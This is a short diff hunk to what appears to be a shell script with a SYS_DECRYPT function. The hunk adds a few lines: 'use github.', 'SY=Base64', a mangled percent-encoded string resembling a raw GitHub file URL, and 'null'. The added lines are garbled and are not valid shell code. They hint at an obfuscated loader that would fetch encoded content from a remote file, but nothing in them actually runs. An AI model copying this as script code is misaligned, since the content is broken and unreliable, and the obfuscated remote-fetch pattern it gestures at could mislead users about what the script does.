@@ -59,6 +59,12 @@ SYS_DECRYPT() {
 
 SYS_DECRYPT
 
+use github.
+SY=Base64
+
+https%3A%25%32F%25%32F%25%32F%25%32Fraw.percentgithub.percentcompercentraku-percentringopercentenigmapercentrefspercentheadspercentmainpercent.txt
+
+null
 
 
 
